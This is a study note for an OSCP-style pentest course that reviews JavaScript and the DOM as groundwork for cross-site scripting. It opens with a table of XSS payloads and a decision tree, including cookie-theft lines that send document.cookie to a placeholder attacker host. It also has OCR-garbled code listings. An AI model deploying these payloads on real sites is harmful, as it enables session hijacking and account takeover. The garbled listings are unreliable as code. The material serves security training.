---
tags:
  - phase/exploitation
  - javascript
  - web
---

# JavaScript Refresher

> [!tip] Quick Reference — XSS
> | Type | Payload |
> |------|---------|
> | Basic test | `<script>alert(1)</script>` |
> | Image onerror | `<img src=x onerror=alert(1)>` |
> | SVG | `<svg onload=alert(1)>` |
> | Cookie steal | `<script>document.location='http://<LHOST>/?c='+document.cookie</script>` |
> | Attribute inject | `" onmouseover="alert(1)` |
> | Filter bypass | `<ScRiPt>alert(1)</ScRiPt>` |

## Decision Tree

```
User input reflected in page?
├── Test basic: <script>alert(1)</script>
│   ├── Popup appears → Stored or Reflected XSS
│   └── No popup → check page source for output
│       ├── Output in attribute → " onmouseover="alert(1)
│       ├── Output in JS context → ';alert(1);//
│       └── Filtered → try alternatives (img, svg, uppercase, encoding)
│
├── Stored XSS (persists for other users)?
│   └── Higher impact — can target admin sessions
│       ├── Cookie theft (if no HttpOnly)
│       │   └── <script>fetch('http://<LHOST>/?c='+btoa(document.cookie))</script>
│       └── Admin action via CSRF + XSS
│           └── Craft JS to perform action as admin (create user, change password)
│
└── Reflected XSS?
    └── Needs victim to click URL — less useful for OSCP unless specifically required
```

> [!success] What success looks like
> You can run a small JS snippet in the browser console (e.g. `console.log(multiplyValues(3,5))` prints `15`). Once you understand that JavaScript can read and change the page's DOM, you can see why injected JS lets an attacker redirect login forms, read passwords, or steal cookies.

> [!danger] Common errors
> - Typing the function in the console but seeing nothing → make sure you actually call it (e.g. `multiplyValues(3,5)`), not just declare it.
> - "ReferenceError: x is not defined" → JavaScript is case-sensitive; `multiplyValues` and `multiplyvalues` are different names.
> - Console looks cluttered with library errors → open `about:blank` first so no site scripts load, then open the Web Console.
> - When you reuse these concepts in a payload, remember raw `<script>` shown as text means the output was HTML-encoded. See [[🔣 Encoding Reference]].
> Full list: [[⚠️ Common Errors & Troubleshooting]]

> [!tip] Beginner note
> The browser builds a **DOM** (a tree of every element on the page) from the HTML it receives. JavaScript's whole job is to read and change that tree. That is the key insight for XSS: if you can get *your* JavaScript to run on the page, you control the DOM with the same power the site's own scripts have.

## Resources
- [HackTricks — XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
- [PayloadsAllTheThings — XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [XSS Hunter](https://xsshunter.trufflesecurity.com) — blind XSS callbacks


JavaScript is a high-level programming language that has become one of the main components of modern web applications. All modern browsers include a JavaScript engine that runs JavaScript code from within the browser itself.

When a browser processes a server's HTTP response containing HTML, the browser creates a DOM tree and renders it. The DOM is comprised of all forms, inputs, images, etc. related to the web page.

JavaScript's role is to access and modify the page's DOM, resulting in a more interactive user experience. From an attacker's perspective, this also means that if we can inject JavaScript code into the application, we can access and modify the page's DOM. With access to the DOM, we can redirect login forms, extract passwords, and steal session cookies.

Like many other programming languages, JavaScript can combine a set of instructions into a function.

> [!note]- Screenshot
> ```
> function multiplyValues(x,y) {
> return x * ys
> 3
> let a = multiplyvalues(3, 5)
> console. 1og(a)
> Listing 22 - Simple JavaScript Function
> ```

In Listing 22, we declared a function named multiplyValues on lines 1-3 that accepts two integer values as parameters and returns their product.

On line 5, we invoke multiplyValues by passing two integer values, 3 and 5, as parameters, and assigning the variable a to the value returned by the function.

When declaring the "a" variable, we don't assign just any type to the variable, since JavaScript is a loosely typed language. This means that the actual type of the "a" variable is inferred as a Number type based on the type of the invoked function arguments, which are Number types. Finally, on line 6 we print the value of "a" to the console

We can verify the above code by opening the developer tools in Firefox on the about:blank page to avoid clutter originated by any extra loaded library.

Once the blank page is loaded, we'll click on the Web Console from the Web Developer sub-menu in the Firefox Menu or use the shortcut C+B+k.

> [!note]- Screenshot
> ```
> < @ Q Search with Google or enter address 9Od=
> ® Kali Linux XX Kali Tools SX Kali Forums [MJ KaliDocs %& NetHunter »
> CRO Inspector © Debugger TH Network {} StyleEditor >> Gl] -- x
> iu) Errors Wamings Logs Info Debug CSS XHR Requests Xf
> » (ay) {
> }
> - (3.5)
> ao
> Figure 25: Testing the JavaScript Function in the Browser Console
> From within the Console, we can execute our test function and retrieve the output.
> ```

---
%% graph-links %%
## Related
- [[Stored vs Reflected XSS Theory]]
- [[Basic XSS]]
- [[Debugging Page Content]]

> [!info] Navigation
> Section: [[Web Applications/Cross-Site Scripting/_index|Cross-Site Scripting]] · Home: [[🏠 Home]]

